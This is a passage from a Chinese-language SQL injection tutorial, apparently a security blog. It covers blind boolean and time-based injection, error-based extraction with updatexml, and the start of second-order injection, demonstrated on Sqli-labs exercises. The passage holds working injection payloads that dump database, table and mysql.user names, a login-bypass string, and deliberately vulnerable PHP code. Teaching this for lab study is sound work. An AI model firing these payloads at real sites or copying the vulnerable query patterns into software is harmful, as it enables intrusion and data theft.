class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getClientIp</span>(<span class=\"params\"></span>) </span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; <span class=\"title function_ invoke__\">strcasecmp</span>(<span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;HTTP_CLIENT_IP&#x27;</span>), <span class=\"string\">&#x27;unknown&#x27;</span>)) &#123;  </span><br><span class=\"line\">        <span class=\"variable\">$ip</span> = <span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;HTTP_CLIENT_IP&#x27;</span>);  </span><br><span class=\"line\">    &#125; <span class=\"keyword\">elseif</span> (<span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; <span class=\"title function_ invoke__\">strcasecmp</span>(<span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>), <span class=\"string\">&#x27;unknown&#x27;</span>)) &#123;  </span><br><span class=\"line\">        <span class=\"variable\">$ip</span> = <span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);  </span><br><span class=\"line\">        <span class=\"variable\">$ips</span> = <span class=\"title function_ invoke__\">explode</span>(<span class=\"string\">&#x27;,&#x27;</span>, <span class=\"variable\">$ip</span>);  </span><br><span class=\"line\">        <span class=\"variable\">$ip</span> = <span class=\"variable\">$ips</span>[<span class=\"number\">0</span>];  </span><br><span class=\"line\">    &#125; <span class=\"keyword\">elseif</span> (<span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>) &amp;&amp; <span class=\"title function_ invoke__\">strcasecmp</span>(<span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>), <span class=\"string\">&#x27;unknown&#x27;</span>)) &#123;  </span><br><span class=\"line\">        <span class=\"variable\">$ip</span> = <span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>);  </span><br><span class=\"line\">    &#125; <span class=\"keyword\">elseif</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">strcasecmp</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>], <span class=\"string\">&#x27;unknown&#x27;</span>)) &#123;  </span><br><span class=\"line\">        <span class=\"variable\">$ip</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>];  </span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;  </span><br><span class=\"line\">        <span class=\"variable\">$ip</span> = <span class=\"string\">&#x27;unknown&#x27;</span>;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$ip</span>;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$ip</span> = <span class=\"title function_ invoke__\">getClientIp</span>();  </span><br><span class=\"line\"><span class=\"comment\">// 只有当ip为192.168.0.1访问时，允许登录</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$ip</span> == <span class=\"string\">&quot;192.168.0.1&quot;</span>) &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$row</span>)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">\t    <span class=\"comment\">// 原本正确输出代码</span></span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">else</span>  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        <span class=\"comment\">// 原本错误输出代码</span></span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h1&gt;禁止访问！&lt;/h1&gt;&quot;</span>;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>什么意思呢？就是我在登录时需要判断用户的登录 IP，这个 IP 值我从 <code>HTTP_CLIENT_IP</code> 或 <code>HTTP_X_FORWARDED_FOR</code> 等这些地方得到，然后 IP 值为 <code>192.168.0.1</code> 时我才允许登录</p>\n</li>\n</ul>\n<h4 id=\"三、盲注\">三、盲注</h4>\n<ul>\n<li>盲注就是在注入过程中，获取的数据 <strong>不能回显至前端页面</strong>。我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注</li>\n</ul>\n<h5 id=\"1-增删改查\">1.增删改查</h5>\n<ul>\n<li><strong>数据查询</strong>\n<ul>\n<li>SELECT *FROM news where id = $id</li>\n</ul>\n</li>\n<li><strong>新增用户，添加新闻等</strong>\n<ul>\n<li>INSERT INTO news (字段名) VALUES (数据)</li>\n</ul>\n</li>\n<li><strong>删除用户，删除新闻等</strong>\n<ul>\n<li>DELETE FROM news WHERE id =$id</li>\n</ul>\n</li>\n<li><strong>修改用户，修改文章等</strong>\n<ul>\n<li>UPDATE news SET id =$id</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"2-布尔盲注-逻辑判断\">2.布尔盲注-逻辑判断</h5>\n<ul>\n<li>\n<p>所谓布尔盲注，布尔是 <code>True</code> 和 <code>False</code> 的意思，就是页面有两种状态，如果我们输入正确的数值就正常（正常回显数据），输入错误的数值就异常（比如某一部分显示空白）</p>\n</li>\n<li>\n<p>那此时就说明页面有两种状态，那么我们就可以基于 <strong>页面的状态判断</strong> 我们注入的 SQL 语句是否正确执行</p>\n</li>\n<li>\n<p>条件：要有可以判断的 bool 回显</p>\n<ul>\n<li>regexp, like, ascii, left, ord, mid</li>\n</ul>\n</li>\n<li>\n<p>注入过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 布尔盲注</span><br><span class=\"line\">1. and length(database()) = 7;   # 判断数据库名长度是否为7</span><br><span class=\"line\"></span><br><span class=\"line\">2. and left(database(), 1) = &#x27;p&#x27;;  # 判断数据库名前1位字符是否为p</span><br><span class=\"line\"></span><br><span class=\"line\">3. and left(database(), 2) = &#x27;pi&#x27;; # 判断数据库名前2位字符是否为pi</span><br><span class=\"line\"></span><br><span class=\"line\">4. and substr(database(), 2, 1) = &#x27;i&#x27;;  # 判断数据库名从第2位开始后面长度为1（第3位）的字符是否为i</span><br><span class=\"line\"></span><br><span class=\"line\">5. and ord(left(database(), 1)) = 112; # 判断数据库名前1位字符转为ascii码之后是否等于112，用于绕过引号检测</span><br><span class=\"line\"></span><br><span class=\"line\">6. and asscii(substr(database(), 1, 1)) &gt; 97; # 判断数据库名第1位字符转为asscii码之后是否大于97，同样用于绕过</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>以 Sqli-labs 第 8 关作为演示案例，当我们输入 id = 1 时，显示一个页面：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/7a29e07ecfe14e9abab9d8fd05f64e52.png\" alt=\"\"></p>\n</li>\n<li>\n<p>当我们输入 <code>id = 1'</code> 时，显示另一个画面：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/89b8a0718c234f3eb944e996f8e89c12.png\" alt=\"\"></p>\n</li>\n<li>\n<p>可以很明显的看到下面的 <code>You are in.......</code> 不见了，那这时就可以使用布尔注入去猜数据</p>\n</li>\n<li>\n<p>那这里我们就可以使用上面的语句尝试猜测一下它的数据库名，<code>payload</code> 为：<code>1' and length(database()) = 7 --+</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/94149db3c832413c94659981cc740201.png\" alt=\"\"></p>\n</li>\n<li>\n<p>回显错误页面，说明长度，改成 8：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/019f7c5b2b6f4638898537510b8267fa.png\" alt=\"\"></p>\n</li>\n<li>\n<p>回显出正确页面，说明数据库名长度等于 8，然后我们就可以进一步猜测数据库名的每个字符等等，这个一般都用脚本或工具来跑，手注太慢了</p>\n</li>\n<li>\n<p>相关资料：<a href=\"https://blog.csdn.net/wangyuxiang946/article/details/123486880\">https://blog.csdn.net/wangyuxiang946/article/details/123486880</a></p>\n</li>\n</ul>\n<h5 id=\"3-时间盲注-延时判断\">3.时间盲注- 延时判断</h5>\n<ul>\n<li>\n<p>时间盲注，也称延时注入，一般是 if 条件语句搭配 sleep() 函数使用，通过条件的正确与否导致页面产生不同程度的延迟来实现注入</p>\n</li>\n<li>\n<p>它在实战中经常用来 <strong>判断某个地方是否存在 SQL 注入</strong>；同时 <strong>当页面没有任何回显/变化时，可以通过它来实现注入</strong></p>\n</li>\n<li>\n<p>注入过程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. and sleep(1); # 休眠1s</span><br><span class=\"line\"></span><br><span class=\"line\">2. and if(length(database()) = 7, sleep(1), 0); # 如果数据库名长度等于7，休眠1s，否则等于0</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里以 Sqli-labs 第 9 关进行演示，这里是单引号闭合方式，输入 <code>id=1</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/ab8dc61dedc04022b6b21b23da07fce7.png\" alt=\"\"></p>\n</li>\n<li>\n<p>然后输入 <code>id=1'</code> 尝试让其闭合报错：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/32319d7cf4f9426c88990c4c2647e574.png\" alt=\"\"></p>\n</li>\n<li>\n<p>可以看到没有任何反应，页面也没啥变化，你甚至可能都不确定这到底是不是个注入点</p>\n</li>\n<li>\n<p>那么此时就可以使用延时注入来判断一下，这里输入 <code>id=1' or if(1, sleep(2), sleep(0)) --+</code>，然后抓包看一下是否会成功延时 3 秒：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/6b0114cea2a042c9a01aa3195cb32ce6.png\" alt=\"\"></p>\n</li>\n<li>\n<p>可以看到确实延迟了 2s，说明我们这个语句成功执行了，那么我们就可以使用上面的语句进行注入了，比如判断数据库名的长度等等，这里就不再演示</p>\n</li>\n<li>\n<p>相关资料：<a href=\"https://blog.csdn.net/wangyuxiang946/article/details/123857045\">https://blog.csdn.net/wangyuxiang946/article/details/123857045</a></p>\n</li>\n</ul>\n<h5 id=\"4-报错注入-报错回显\">4.报错注入-报错回显</h5>\n<ul>\n<li>\n<p>其实这个也算是有回显的注入类型了，所谓报错注入就是，开发者人员为了方便调试，会将 SQL 语句执行错误后的报错信息输出到前端页面当中</p>\n</li>\n<li>\n<p>试用情况：页面有数据库的报错信息：</p>\n<ul>\n<li>报错信息必须是动态的，来自数据库的报错信息</li>\n<li>网站是写死的、自定义的报错不算</li>\n</ul>\n</li>\n<li>\n<p>一般在 php 中是这段代码：</p>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">die</span>(<span class=\"title function_ invoke__\">mysqli_error</span>(<span class=\"variable\">$conn</span>));</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>如果代码审计中看到这个东西，那就可以尝试报错注入</p>\n</li>\n<li>\n<p>注入过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27; and updatexml(1,&#x27;~&#x27;,3) #检查报错信息是否正常回显</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(schema_name)from information_schema.schemata), 1 , 31)),3)   #获取所有数据库</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;), 1 , 31)),3)    #获取所有表名</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;), 1 , 31)),3) </span><br><span class=\"line\">#获取所有字段</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27;and updatexml(1, concat(0x7e, (SELECT version(), 0x7e)), 1);  # 报错回显出当前MySQL版本号</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1 and extractvalue(1, concat(0x5c, (SELECT table_name from information_schema.tables limit 1))); </span><br><span class=\"line\">#报错回显出当前第一行表名</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>原理：<code>upadatexml</code> 函数，当第二个参数包含特殊符号时如 <code>0x7e</code> 就会报错成 <code>~</code>，并将第二个参数的内容显示在报错信息中</p>\n</li>\n<li>\n<p><code>concat</code>：拼接特殊符号个查询结果</p>\n</li>\n<li>\n<p>长度限制：updatexml() 函数的报错内容长度不能超过 32 个字符，常用的解决方式有两种：</p>\n<ul>\n<li>limit 分页</li>\n<li>substr()截取字符</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27; and updatexml(1,concat(0x7e,(select userfrom mysql.user limit 1,1)),3)  </span><br><span class=\"line\">#linmit，limit(0,1)展示第0条数据，limit(1,1)展示第一条数据</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user)from mysql.user), 1 , 31)),3)</span><br><span class=\"line\">#substr(),从第一个字符截取到31个字符</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里同样以 Sqli-labs 第 1 关为例，我们可以看看代码是怎么写的：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>]))  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];  </span><br><span class=\"line\"><span class=\"comment\">//logging the connection parameters to a file for analysis.  </span></span><br><span class=\"line\">    <span class=\"variable\">$fp</span>=<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;result.txt&#x27;</span>,<span class=\"string\">&#x27;a&#x27;</span>);  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$fp</span>,<span class=\"string\">&#x27;ID:&#x27;</span>.<span class=\"variable\">$id</span>.<span class=\"string\">&quot;\\n&quot;</span>);  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$fp</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// connectivity   </span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;  </span><br><span class=\"line\">    <span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$row</span>)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        <span class=\"comment\">// 显示正常页面</span></span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">else</span>  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;  </span><br><span class=\"line\">        <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());    <span class=\"comment\">// 最主要就是加了一句这个代码！</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123; <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>我们输入 <code>id=1</code>，正常回显：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/d5e35162f3764a7c8e9035f3387b5408.png\" alt=\"\"></p>\n</li>\n<li>\n<p>当我们输入 <code>id=1'</code> 时，就会产生 SQL 语句报错：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/1a46b8311e7a4c9ea4db6face2c621d1.png\" alt=\"\"></p>\n</li>\n<li>\n<p>那此时就可以使用报错注入，比如输入 <code>payload</code> 为 <code>id=1' and updatexml(1,concat(0x7e, database(), 0x7e),1) --+</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/73764e9de5fc439a972125892aad2094.png\" alt=\"\"></p>\n</li>\n<li>\n<p>就成功爆出数据库名了，接下来就和 <code>union select</code> 差不多的步骤，通过 <code>information_schema</code> 爆出其他数据</p>\n</li>\n<li>\n<p>相关资料：<a href=\"https://blog.csdn.net/wangyuxiang946/article/details/123416521\">https://blog.csdn.net/wangyuxiang946/article/details/123416521</a></p>\n</li>\n</ul>\n<h5 id=\"5-注入条件-数据回显-错误处理\">5.注入条件-数据回显&amp;错误处理</h5>\n<ul>\n<li>\n<p>基于延时：都不需要</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and if(1, sleep(5), 0);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>基于布尔：有数据库输出判断标准</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and length(database()) = 6;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>基于报错：有数据库报错处理判断标准</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and updatexml(1,concat(0x7e, (SELECT version(), 0x7e), 1))</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>测试 <code>delete</code> 注入：（有无回显，有无报错）</p>\n<ul>\n<li>延迟：<strong>1 or if (1, sleep(5), 0)</strong></li>\n<li>布尔：<strong>3 and length(database())= 6</strong>（无回显，无法判断注入）</li>\n<li>报错：<strong>4 and updatexml(1, concat(0x7e, (SELECT version(), 0x7e), 1))</strong></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"四、进阶注入\">四、进阶注入</h4>\n<h5 id=\"1-二次注入\">1.二次注入</h5>\n<ul>\n<li>什么是二次注入，其实很简单，它满足的条件就是 <strong>先插后取</strong> ==&gt; 先执行插入操作，再执行查询/更新操作</li>\n<li>简单来说就是，数据库会先插入我们恶意的 SQL 语句，但在 <strong>当前的功能点这个恶意 SQL 语句是不执行的</strong>；我们可以通过另外一个地方去尝试让 <strong>服务器自己调用</strong> 这个恶意 SQL 语句，达到注入的效果</li>\n<li>那你会问，插入时 SQL 语句都不执行，后面为什么会执行呢？、\n<ul>\n<li>这里就是二次注入的 <strong>关键点</strong>：它 <strong>需要在执行插入语句的时候将我们代码中的引号这些转义掉</strong></li>\n<li>而在数据库中插入数据时出现转义符会将转义符去掉，然后将全部字符当作字符串处理，就不会导致提前闭合</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/d86133eb7fe04402a370e8aba044a831.png\" alt=\"\"></p>\n<ul>\n<li>\n<p>这里用 Sqli-labs 第 24 关演示一下</p>\n</li>\n<li>\n<p>假设我们知道用户名是 <code>admin</code>，但是不知道密码是多少</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/218e66bcb37a45268ae5a4b4b24752b2.png\" alt=\"\"></p>\n</li>\n<li>\n<p>首先尝试一下 <a href=\"https://so.csdn.net/so/search?q=%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81&amp;spm=1001.2101.3001.7020\">万能密码</a> <code>admin' or 1=1 #</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/1fc731c2e8704efe86f0d31ba73693b1.png\" alt=\"\"></p>\n</li>\n<li>\n<p>登录失败，提示我是个愚蠢的黑客，说明有过滤，看一看源码 <code>login.php</code>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$username</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;login_user&quot;</span>]);  </span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;login_password&quot;</span>]);  </span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT * FROM users WHERE username=&#x27;<span class=\"subst\">$username</span>&#x27; and password=&#x27;<span class=\"subst\">$password</span>&#x27;&quot;</span>;  </span><br><span class=\"line\"><span class=\"comment\">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;  </span></span><br><span class=\"line\"><span class=\"variable\">$res</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);  </span><br><span class=\"line\"><span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysql_fetch_row</span>(<span class=\"variable\">$res</span>);  </span><br><span class=\"line\"><span class=\"comment\">//print_r($row) ;  </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>[<span class=\"number\">1</span>]) &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$row</span>[<span class=\"number\">1</span>];  </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>可以看到使用了 <code>mysql_real_escape_string()</code> 函数，这个函数就是用来转义我们的输入的引号，他会转义成 <code>\\'</code> 或者 <code>\\&quot;</code>，所以我们无法注入</p>\n</li>\n<li>\n<p>我们看到他有修改密码的选项，我们看能不能试着修改 <code>admin</code> 的密码，发现这里点不了：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/5ae5440c82264341bb0ff45ace64b718.png\" alt=\"\"></p>\n</li>\n<li>\n<p>看一看源码，有什么触发条件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 从SESSION中取出&quot;username&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$username</span>= <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&quot;username&quot;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$curr_pass</span>= <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;current_password&#x27;</span>]);  </span><br><span class=\"line\"><span class=\"variable\">$pass</span>= <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);  </span><br><span class=\"line\"><span class=\"variable\">$re_pass</span>= <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;re_password&#x27;</span>]);  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$pass</span>==<span class=\"variable\">$re_pass</span>)  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">\t<span class=\"comment\">// 更新密码！</span></span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;UPDATE users SET PASSWORD=&#x27;<span class=\"subst\">$pass</span>&#x27; where username=&#x27;<span class=\"subst\">$username</span>&#x27; and password=&#x27;<span class=\"subst\">$curr_pass</span>&#x27; &quot;</span>;  </span><br><span class=\"line\">    <span class=\"variable\">$res</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);  </span><br><span class=\"line\">    <span class=\"comment\">// 其他代码</span></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">else</span>  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    <span class=\"comment\">// 其他代码</span></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>他需要有 SESSION 值才行，说明要先登录，然后我们看到他下面有一个更新数据的 SQL 语句</p>\n</li>\n<li>\n<p>这里有一个很 <strong>重要</strong> 